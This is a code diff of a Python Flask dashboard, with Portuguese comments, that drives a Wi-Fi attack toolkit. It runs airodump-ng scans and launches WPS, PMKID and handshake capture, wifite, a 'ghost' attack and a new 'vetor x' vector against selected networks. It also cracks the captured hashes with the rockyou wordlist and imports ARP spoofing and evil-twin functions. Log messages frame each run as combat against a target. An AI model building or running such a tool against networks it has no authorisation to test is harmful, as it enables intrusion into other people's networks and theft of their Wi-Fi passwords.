@@ -6,14 +6,12 @@ import threading
 from datetime import datetime
 from flask import Flask, render_template, request, jsonify
 
-# Importa o núcleo
 import wifi_auditor
-from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash, identify_vendor, analyze_vulnerabilities, capture_wps, fix_drivers_wifi6, start_ghost_attack, boost_signal, start_wifite_expert, start_evil_twin
+from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash, identify_vendor, analyze_vulnerabilities, capture_wps, fix_drivers_wifi6, start_ghost_attack, boost_signal, start_wifite_expert, start_evil_twin, capture_vetor_x
 from dsi_sniffer import DSISniffer, spoof, restore_arp
 
 app = Flask(__name__)
 
-# Variáveis globais
 CURRENT_MONITOR_IFACE = None
 SCAN_PROCESS = None
 CSV_PREFIX = "web_scan_results"
@@ -27,12 +25,10 @@ def add_log(msg, log_type="info", is_command=False):
     SESSION_LOGS.append(log_entry)
     print(f"[{timestamp}] [{log_type.upper()}] {msg}")
 
-# VINCULA O LOG DO NÚCLEO À WEB
 wifi_auditor.WEB_CALLBACK = add_log
 
 @app.route('/')
-def dashboard():
-    return render_template('index.html')
+def dashboard(): return render_template('index.html')
 
 @app.route('/api/logs', methods=['GET'])
 def get_logs():
@@ -57,21 +53,15 @@ def start_monitor():
     iface = request.get_json().get('interface')
     if not iface: return jsonify({"status": "error"}), 400
     CURRENT_MONITOR_IFACE = set_monitor_mode(iface)
-    if CURRENT_MONITOR_IFACE:
-        return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
+    if CURRENT_MONITOR_IFACE: return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
     return jsonify({"status": "error"}), 500
 
 @app.route('/api/start_scan', methods=['POST'])
 def start_scan():
     global SCAN_PROCESS, CURRENT_MONITOR_IFACE
-    if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error", "message": "Não armado."}), 400
-    
-    # Potencializa rádio e habilita 5GHz antes de escanear
-    boost_signal(CURRENT_MONITOR_IFACE)
-    add_log("Radar Dual-Band (2.4GHz + 5GHz) ACIONADO com Ganho de Sinal.", log_type="cmd", is_command=True)
-    
+    if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error"}), 400
+    add_log("Varredura Ativa DSI Iniciada.", log_type="cmd", is_command=True)
     run_command(f"rm -f {CSV_PREFIX}-01.*")
-    # --band abg habilita varredura em todas as frequências (A, B e G)
     cmd = f"airodump-ng --band abg --output-format csv -w {CSV_PREFIX} --update 1 {CURRENT_MONITOR_IFACE}"
     SCAN_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     return jsonify({"status": "success"})
@@ -79,14 +69,12 @@ def start_scan():
 @app.route('/api/stop_scan', methods=['POST'])
 def stop_scan():
     global SCAN_PROCESS
-    if SCAN_PROCESS:
-        SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
+    if SCAN_PROCESS: SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
     return jsonify({"status": "success"})
 
 @app.route('/api/get_networks', methods=['GET'])
 def get_networks():
-    csv_file = f"{CSV_PREFIX}-01.csv"
-    networks = []
+    csv_file = f"{CSV_PREFIX}-01.csv"; networks = []
     if os.path.exists(csv_file):
         try:
             with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
@@ -106,30 +94,24 @@ def get_networks():
 def attack_task(attack_type, bssid, channel, essid, privacy):
     vendor = identify_vendor(bssid)
     _, advice = analyze_vulnerabilities(vendor, essid, privacy)
-    add_log(f"ATAQUE INICIADO: {essid} ({vendor})", log_type="cmd", is_command=True)
+    add_log(f"COMBATE INICIADO: {essid} ({vendor})", log_type="cmd", is_command=True)
+    add_log(f"DSI INTEL: {advice}")
     prefix = f"web_capture_{essid.replace(' ', '_')}"
     cap_file = None
-    if attack_type == 'wps':
-        capture_wps(CURRENT_MONITOR_IFACE, bssid, channel)
-        return
-    if attack_type == 'ghost':
-        start_ghost_attack(CURRENT_MONITOR_IFACE, essid)
-        return
-    if attack_type == 'wifite':
-        start_wifite_expert(CURRENT_MONITOR_IFACE)
-        return
-    if attack_type == 'eviltwin':
-        start_evil_twin(CURRENT_MONITOR_IFACE, essid)
-        return
-    if attack_type == 'pmkid':
+    if attack_type == 'wps': capture_wps(CURRENT_MONITOR_IFACE, bssid, channel); return
+    if attack_type == 'ghost': start_ghost_attack(CURRENT_MONITOR_IFACE, essid); return
+    if attack_type == 'wifite': start_wifite_expert(CURRENT_MONITOR_IFACE); return
+    if attack_type == 'vetorx':
+        add_log("Executando VETOR X (Incursão Total de Última Geração)...")
+        cap_file = capture_vetor_x(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+    elif attack_type == 'pmkid':
         cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
         if not cap_file: cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
-    else:
-        cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+    else: cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
     if cap_file:
         wordlist = "/usr/share/wordlists/rockyou.txt"
         if os.path.exists(wordlist): crack_hash(cap_file, wordlist, bssid)
-    else: add_log("Alvo resistiu aos vetores táticos.", log_type="error")
+    else: add_log("Alvo impenetrável aos vetores atuais.", log_type="error")
 
 @app.route('/api/attack', methods=['POST'])
 def launch_attack():
